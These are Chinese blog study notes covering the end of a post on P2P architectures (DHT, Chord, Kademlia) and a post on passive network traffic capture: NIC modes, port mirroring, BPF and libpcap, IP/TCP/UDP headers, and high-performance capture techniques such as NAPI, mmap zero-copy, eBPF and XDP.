<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2015.png" alt="Untitled"></p>
<p><strong>不足：</strong></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2016.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2017.png" alt="Untitled"></p>
<p>(具有分布式雏形</p>
<h3 id="完全分布式的P2P">完全分布式的P2P</h3>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2018.png" alt="Untitled"></p>
<p>特点就是泛洪</p>
<p>但是全网泛红又有缺点</p>
<p>所以出现了层次P2P</p>
<h3 id="层次P2P">层次P2P</h3>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2019.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2020.png" alt="Untitled"></p>
<h3 id="分布式哈希表系统-结构化P2P">分布式哈希表系统(结构化P2P)</h3>
<p>这个系统可以提高文件搜索效率的同时，又不依赖中心节点或局部中心节点。使用结构化对等网，基于分布式哈希表(Distributed Hash Table，简称DHT)而建。</p>
<p><strong>结构化P2P：直接根据查询内的关键字定位其索引的存放节点，索引为&lt;key, value&gt;对。</strong></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2021.png" alt="Untitled"></p>
<p>需要尽可能地保证表小一点，而且能够查询所有节点。需要在O(n)复杂度找到目标。</p>
<p>参考二分查找，路由表应该这样建</p>
<p><strong>节点n的路由表：</strong></p>
<table>
<thead>
<tr>
<th>1</th>
<th>n+1</th>
</tr>
</thead>
<tbody>
<tr>
<td>2</td>
<td>n+2</td>
</tr>
<tr>
<td>3</td>
<td>n+4</td>
</tr>
<tr>
<td>4</td>
<td>n+8</td>
</tr>
<tr>
<td>5</td>
<td>n+16</td>
</tr>
</tbody>
</table>
<h3 id="另外一种操作-Chord-Hash表分布">另外一种操作 Chord-Hash表分布</h3>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2022.png" alt="Untitled"></p>
<p>简单来说就是对两个值进行hash</p>
<p>N = hash(IP)，这个用来弄出你是第几个节点</p>
<p>K = hash(X)，这个表示你要上传/下载的东西应该放在哪</p>
<p>例如上传K = 54，则应该放在N51~N56之间，而且存放在N56，</p>
<p>查询的时候同理搜索至N56</p>
<p><strong>优化：</strong></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2023.png" alt="Untitled"></p>
<p>将每个节点的表变为二分的表，增大了一点，但是查询/上传效率高了不少</p>
<h3 id="Kademlia-Kad-也是一种经典的结构化P2P">Kademlia(Kad)也是一种经典的结构化P2P</h3>
<p>Kad网络中每一个节点都有一个160bits的ID值作为标志符，Key也是一个160bits的标志符，每加入一个Kad，网络都会被分配一个Kad(可以认为ID是随机产生的)，&lt;key, value&gt;对的数据就存放在ID值最接近key值得节点上</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2024.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2025.png" alt="Untitled"></p>
<p><strong>如何查询：</strong></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2026.png" alt="Untitled"></p>
<p><strong>K桶</strong></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2027.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2028.png" alt="Untitled"></p>
<p>总的来说就是每个节点都会有个K桶，这个K桶通过计算距离，可以来搜索目标节点。</p>
<p>当新节点加入得时候需要泛红来传播新Kad节点信息。</p>
<p>当然K桶不需要这么大，我觉得二分大小也可以。</p>
<h1>总结</h1>
<h2 id="P2P结构分类">P2P结构分类</h2>
<p>非结构化的→完全分布式的P2P网络</p>
<p>基于目录服务器的P2P网络</p>
<p>层次P2P网络</p>
<p>结构化P2P</p>
<h2 id="P2P技术的特点">P2P技术的特点</h2>
<p>非中心化</p>
<p>扩展性</p>
<p>健壮性</p>
<p>高性价比</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/24/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/24/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96/" class="post-title-link" itemprop="url">网络信息获取之被动获取</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-24 20:41:47 / 修改时间：20:43:11" itemprop="dateCreated datePublished" datetime="2023-11-24T20:41:47+08:00">2023-11-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>网络信息获取之被动获取</h1>
<h1>TCP/IP协议</h1>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%201.png" alt="Untitled"></p>
<p>数据包接收：</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%202.png" alt="Untitled"></p>
<h1>以太网的通讯</h1>
<p>以太网处理一二层，也就是我们的链路层和物理层，与TCP/IP协议通过ARP和RARP协议进行相互转换。</p>
<p>同时具有<strong>载波监听</strong>和<strong>冲突检测</strong>功能。</p>
<p>在以太网中，所有的通讯都是广播的。因此在同一个网段下的所有网络接口都可以访问在物理媒体上传输的数据。</p>
<p>正常情况下，一<strong>个网络接口只响应这两种数据</strong>：</p>
<ol>
<li class="lvl-3">
<p>与自己mac地址相匹配的数据帧</p>
</li>
<li class="lvl-3">
<p>发向所有机器的广播数据帧</p>
</li>
</ol>
<p><strong>网卡收发数据步骤</strong>：</p>
<ol>
<li class="lvl-3">
<p>网卡接收到传输来的数据，由网卡内的单片程序接收数据帧的目的MAC地址，并由网卡驱动程序的接受模式判断该不该接收</p>
</li>
<li class="lvl-3">
<p>如果认为接收则产生中断信号通知CPU</p>
</li>
<li class="lvl-3">
<p>认为不接收则直接丢弃</p>
</li>
<li class="lvl-3">
<p>CPU得到中断信号产生中断，操作系统根据网卡驱动程序设置的网卡中断程序地址调用驱动程序接收数据</p>
</li>
<li class="lvl-3">
<p>驱动程序接收数据后放入信号堆栈让操作系统处理。</p>
</li>
</ol>
<p><strong>网卡有四种接收方式</strong></p>
<ol>
<li class="lvl-3">
<p>广播方式：该模式下的网卡能够接收网络中的广播信息。</p>
</li>
<li class="lvl-3">
<p>组播方式：设置在该模式下的网卡能够接收组播数据。</p>
</li>
<li class="lvl-3">
<p>直接方式：在这种模式下，只接收目的网卡的数据</p>
</li>
<li class="lvl-3">
<p>混杂模式：在这种模式下的网卡能够接受一切通过它的数据，而不管这个数据是否是传给他的。</p>
</li>
</ol>
<h1>被动获取</h1>
<p>这里的被动指的是监听/嗅探的方式，收集流经设备的流量。</p>
<p>主要分为串行和旁路模式</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%203.png" alt="Untitled"></p>
<p>旁路模式的常见网络设备主要是 <strong>集线器、交换机</strong></p>
<p>串行模式的常见网络设备主要是 <strong>网桥、网关、路由器</strong></p>
<p>进而划分<strong>串联监控模式和旁路监控模式</strong></p>
<p>旁路监控主要依赖”镜像端口”功能来实现监控，也就是将数据复制为两份，一份发给镜像端口，一份发给目的端口。</p>
<p><strong>优缺点:</strong></p>
<p>旁路部署起来比较灵活方便，不会影响现有的网络结构，串行需要对现有网络结构进行变动。</p>
<p>旁路模式对原始传递的数据包不会造成时延，不会对网速造成任何影响。而串联模式是串联在网络中的，所有的数据都需要先经过监控系统，检查之后再发给各个客户端，有一定的时延。</p>
<p>旁路监控设备一旦故障或者停止运行，不会影响现有网络，而串联监控设备如果出现故障，会导致网络中断，导致网络单点故障。</p>
<p>总结：</p>
<ol>
<li class="lvl-3">
<p><strong>对网络结构影响</strong></p>
</li>
<li class="lvl-3">
<p><strong>时延</strong></p>
</li>
<li class="lvl-3">
<p><strong>单点故障</strong></p>
</li>
</ol>
<p>但是同样旁路也存在局限性。</p>
<p>**数据获取：**旁路需要交换机支持端口镜像才可以实现监控。</p>
<p>**数据管控：**旁路模式采用发送RST包的方式来断开TCP连接，不能禁止UDP通讯。对于UDP应用，还需要在路由器上面禁止UDP端口进行配合。而串联模式不存在这个问题。</p>
<p>串行适用的网络产品：防火墙，数据包过滤设备。</p>
<p>旁路适用的网络设备：内容审计，内容分析，检测设备。</p>
<p><strong>数据分流技术</strong></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%204.png" alt="Untitled"></p>
<p>主要有三种分流的方式：</p>
<ol>
<li class="lvl-3">
<p><strong>分光器</strong> 将光缆上的光信号直接备份出一份，最简单的方式，设备要求最高。</p>
</li>
<li class="lvl-3">
<p><strong>路由交换</strong> 交换机需要通过镜像端口</p>
</li>
<li class="lvl-3">
<p><strong>HUB</strong> 集线器能够看到所有端口的报文</p>
</li>
</ol>
<h1>包捕获技术</h1>
<p>为了实现被动捕包，将在数据链路层设置旁路监听。</p>
<h2 id="基于socket的网络的编程方法">基于socket的网络的编程方法</h2>
<p>思路是将网络通讯当作”文件”描述字符进行处理，极大地简化了网络程序开发过程。</p>
<p>Linux内核版本2.0以前的一种套接字类型，可以接收网络上所有的数据包。</p>
<h2 id="数据链路提供者接口-DLPI">数据链路提供者接口(DLPI)</h2>
<p><strong>Data Link Provider Interface</strong>，定义了数据链路层向网络层提供的服务，是数据链路服务的提供者和使用者之间的一种标准接口，在实现上基于<strong>Unix</strong>的流机制。数据链路层服务的使用者既可以是用户的应用程序，也可以是访问数据链路服务的高层协议，比如TCP/IP等。</p>
<p>实际上是一种物理设备辅助(</p>
<h2 id="BPF-伯克利数据包过滤器">BPF 伯克利数据包过滤器</h2>
<p>这个过滤器工作在操作系统的内核层，主要由<strong>网络转发部分和数据包过滤两部分组成</strong>。</p>
<p>效率很高，而且使用了数据缓存机制，使捕获数据包缓存在内核中，达到一定数量再传递给程序。</p>
<p>实际应用上用Libpcap实现</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%205.png" alt="Untitled"></p>
<p>理论上来说即使被iptables封禁了某些数据包，tcpdump仍可以抓到，因为tcpdump作用于网络接口层，而iptables作用于IP协议层，tcpdump理论可以先抓到包。</p>
<h1>一些常用的库</h1>
<h3 id="libnet">libnet</h3>
<p>提供的接口函数主要实现和封装了数据包的构造和发送过程</p>
<h3 id="libpcap">libpcap</h3>
<p>提供的接口函数主要实现和封装了与数据包截获有关的过程</p>
<h3 id="libnids">libnids</h3>
<p>提供的接口函数主要实现了开发网络入侵监测系统所必须的一些结构框架</p>
<h3 id="Libdnet">Libdnet</h3>
<p>通用网络安全开发包</p>
<h3 id="libicmp等">libicmp等</h3>
<p>相对较为简单，封装的是ICMP数据包的主要处理过程(构造、发送、接收等)</p>
<h1>协议的关键字段IP/TCP/UDP</h1>
<h2 id="IP数据包">IP数据包</h2>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%206.png" alt="Untitled"></p>
<p>如图所示，每一行为4Bytes，也就是32bits</p>
<p>固定部分有20Bytes。对于可选字段来说，一般是32bit(4Bytes)的整数倍，无最小，最大为40Bytes，当有可选项字段不足32bits的时候，余下的部分用无用数据来填充，所以一个完整的IP包头，最小为20Bytes，最大为60Bytes。</p>
<h3 id="版本号-4bits-：">版本号(4bits)：</h3>
<p>告知IP地址是ipv4地址还是ipv6地址</p>
<h3 id="首部长度-4bits-：">首部长度(4bits)：</h3>
<p>告知这个数据包头的长度，由此推断出有无可选项</p>
<h3 id="服务类型TOS-8bits-：">服务类型TOS(8bits)：</h3>
<p>按位被定义为 PPP DTRM0<br>
PPP：定义包的优先级，取值越大数据越重要<br>
000 普通 (Routine)<br>
001 优先的 (Priority)<br>
010 立即的发送 (Immediate)<br>
011 闪电式的 (Flash)<br>
100 比闪电还闪电式的 (Flash Override)<br>
101 CRI/TIC/ECP(找不到这个词的翻译)<br>
110 网间控制 (Internetwork Control)<br>
111 网络控制 (Network Control)<br>
D 时延: 0:普通 1:延迟尽量小<br>
T 吞吐量: 0:普通 1:流量尽量大<br>
R 可靠性: 0:普通 1:可靠性尽量大<br>
M 传输成本: 0:普通 1:成本尽量小<br>
0 最后一位被保留，恒定为0</p>
<h3 id="总长度-16bits-：">总长度(16bits)：</h3>
<p>告知IP数据报文的总长度（包括被分片数据在内），最大承载量为1500字节，超过将进行数据分片</p>
<h3 id="片偏移量-13bits-：">片偏移量(13bits)：</h3>
<p>决定IP分片数据的先后顺序，只能是0或1480的倍数，第一个分片数据发送时偏移量为0，第二个为1480，第三个为2960，以此类推。目的端重组数据包时靠偏移量来按顺序组合分片数据</p>
<h3 id="标志位-3bits-：">标志位(3bits)：</h3>
<p>第一位bit未启用为0</p>
<p>第二位bit如果需要分片第二位为0，不需要分片第二位为1</p>
<p>第三位比特为1代表还有后续分片，为0代表为最后一个分片共有三种情况：<br>
001（需要分片且还有后续分片）<br>
000（需要分片且当前为最后一个分片）<br>
010（不需要分片）</p>
<h3 id="标识符-16bits-：">标识符(16bits)：</h3>
<p>区分不同的IP数据包的分片数据，在目的端重组分片数据时能快速找到同一数据包的分片数据</p>
<h3 id="生存时间TTL-8bits-：">生存时间TTL(8bits)：</h3>
<p>范围为1-255；单位为跳数，数据包每经过一台路由器即为一跳，TTL值减一；当TTL为0时，丢弃数据包。作用是防止数据包在网络中永久的循环<br>
Windows系统TTL一般为128，Linux系统TTL为1-128之间，通常为56,64。注：跳点跟踪命令：tracert IP地址</p>
<h3 id="协议-8bits-：">协议(8bits)：</h3>
<p>区分上层协议；6代表TCP协议，17代表UDP协议</p>
<h3 id="首部校验和-16bits-：">首部校验和(16bits)：</h3>
<p>校验三层IP包头是否有误</p>
<h3 id="源IP地址-32-bits-：">源IP地址(32 bits)：</h3>
<p>指发送数据包的主机地址</p>
<h3 id="目的IP地址-32-bits-：">目的IP地址(32 bits)：</h3>
<p>指接收数据包的目标主机地址</p>
<h3 id="选项字段：">选项字段：</h3>
<p>通常不会使用到，因为IP包头部分的长度单位为32bit，因此可选项字段的长度必须为32bit的整数倍，当使用时且剩余部分不足32bit会自动填充无用数据来补足32bit。</p>
<h2 id="UDP数据包">UDP数据包</h2>
<p>这个容易理解，首部大小为8 Bytes，注意这里是数据包长度</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%207.png" alt="Untitled"></p>
<h2 id="TCP数据包">TCP数据包</h2>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%208.png" alt="Untitled"></p>
<p>flag位：</p>
<p>1）CWR、ECE，与IP首部的ECN字段对应，ECE标志为1，则通知对方网络拥塞，已将拥塞窗口缩小。<br>
2）URG：urgent flag，置1是表示数据需要紧急处置<br>
3）ACK：acknowledgement flag，置1时，确认应答字段有效，除了建立连接的SYN包之外均应置1<br>
4）PSH：push flag，置1时，应立刻传给上层应用协议，PSH置0时，并不需要立刻传而是先缓存<br>
5）RST：reset flag，置1时表示TCP连接出现异常必须紧急断开连接。<br>
6）SYN：synchronize flag，用于建立连接，并在其序列号字段进行序列号初始值设置。<br>
7）FIN：finish flag，置1时希望断开连接。</p>
<p>5-1.<strong>校验和</strong>：16位，包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p>
<h1>网络捕包的基本流程</h1>
<ol>
<li class="lvl-3">
<p>把网卡等同于文件进行I/O</p>
<p>查找网卡：Find all devices()</p>
<p>打开网卡：open()</p>
</li>
<li class="lvl-3">
<p>从网卡中读取数据</p>
<p>监听：loop()</p>
<p>数据回传给用户变量</p>
</li>
<li class="lvl-3">
<p>处理获取的数据</p>
<p>转用户程序执行：Handler()</p>
</li>
<li class="lvl-3">
<p>释放I/O资源</p>
</li>
</ol>
<h1>与TCP有关</h1>
<p>读者不懒，读者不懒不太可能。</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%209.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2010.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2011.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2012.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2013.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2014.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2015.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2016.png" alt="Untitled"></p>
<h1>高性能捕包</h1>
<p>造成丢包的主要原因是：</p>
<ol>
<li class="lvl-3">
<p>CPU处于频繁中断状态，造成接收数据包效率低下。</p>
</li>
<li class="lvl-3">
<p>数据包被多次拷贝，浪费了大量的时间和资源。从网卡驱动到内核，再到内核到用户空间。</p>
</li>
</ol>
<h2 id="Linux传统优化技术-NAPI技术-DMA">Linux传统优化技术-NAPI技术(DMA)</h2>
<p>NAPI（New API）技术是linux上采用的一种提高网络处理效率的技术，它的核心就是<strong>不采用中断的方式读取数据</strong>，取而代之的是采用中断唤醒数据接收的服务程序(<strong>软中断</strong>)，然后用POLL的方法来轮询数据。</p>
<p>NAPI技术的设备轮询机制具体特点如下：</p>
<ol>
<li class="lvl-3">
<p>当一个网卡接收到一个数据包，便产生一个中断信号给系统</p>
</li>
<li class="lvl-3">
<p>系统进行如下操作：</p>
</li>
</ol>
<p>关闭网卡中断(屏蔽了中断信号，网卡仍然可以接收数据报到缓冲队列)</p>
<p>激活轮询进程，对该网卡进行轮询(处理缓冲队列)</p>
<p>打开网卡中断(解除屏蔽中断信号)</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2017.png" alt="Untitled"></p>
<h3 id="DMA技术">DMA技术</h3>
<p>DMA技术不过多介绍了，可以在DMA控制器下，将数据从网卡拷贝到主存，拷贝过程中，CPU是不参与的。直接避免开销。</p>
<h3 id="无锁环形队列">无锁环形队列</h3>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2018.png" alt="Untitled"></p>
<h2 id="通过mmap实现零拷贝I-O">通过mmap实现零拷贝I/O</h2>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2019.png" alt="Untitled"></p>
<p>简单来说就是将内存直接映射到内核区域，不需要经过拷贝了，只是页表的替换(</p>
<p>mmap原理：虚拟内存可以通过页目录，页表映射到物理内存地址，也可以直接映射到物理磁盘(文件)上。当内核的一块内存区域映射到一个文件，而用户进程(server进程)又关联到这个文件，那么用户即可直接操作这块区域了。此时如果映射的内存是DMA的内存区域，即可实现零拷贝</p>
<h2 id="传统的报文分组捕获模型和零拷贝报文获取方式对比">传统的报文分组捕获模型和零拷贝报文获取方式对比</h2>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2020.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E8%A2%AB%E5%8A%A8%E8%8E%B7%E5%8F%96%20346be0c29ec34ad8bc9bbc1dd7589f1b/Untitled%2021.png" alt="Untitled"></p>
<h2 id="ebpf技术-kernel-bypass">ebpf技术(kernel bypass)</h2>
<p><s>bpf是linux内核中高度灵活和高效的类似虚拟机的技术，允许以安全的方式在各个挂钩点执行字节码。它用于许多Linux内核子系统，最突出的是网络、跟踪和安全。</s></p>
<p><s>ebpf是比较新的扩展的BPF技术，具有更为庞大的功能体系。</s></p>
<p>实际上的运用就是kernel bypass技术，也就是内核旁路技术，跳过内核的网络层，在用户态user-space做全部的包处理。kernel bypass涉及到从user-space管理NIC(network interface controller，网卡)，也就是需要用户态的驱动程序来处理NIC。</p>
<p>用户态程序完全控制NIC，有什么好处呢？减少了内核开销；等</p>
<p>坏处呢？用户程序需要直接管理硬件；kernel被完全跳过，所以内核提供的所有网络功能也被跳过，用户程序可能需要实现一些原来内核提供的功能；</p>
<p>BPF是一个VM，它定义了一个程序执行的环境。除了字节码，它还定义了基于数据包的内存模型(packet-based memory model)、寄存器(A and X; Accumulator ans Index register)、暂存内存(scratch memory)、隐式程序计数器(implicit pc)。</p>
<h2 id="xdp-kernel-bypass">xdp(kernel bypass)</h2>
<p>XDP的全称是：eXpress Data Path</p>
<p>XDP是Linux内核中提供高性能、可编程的网络数据包处理框架。</p>
<ol>
<li class="lvl-3">
<p>直接接管网卡的RX数据包(类似DPDK用户态驱动)处理</p>
</li>
<li class="lvl-3">
<p>通过运行BPF指令快速处理报文</p>
</li>
<li class="lvl-3">
<p>和linux协议栈无缝对接</p>
</li>
</ol>
<p>哈哈难蹦，原来是和ebpf一块工作的，如图：</p>
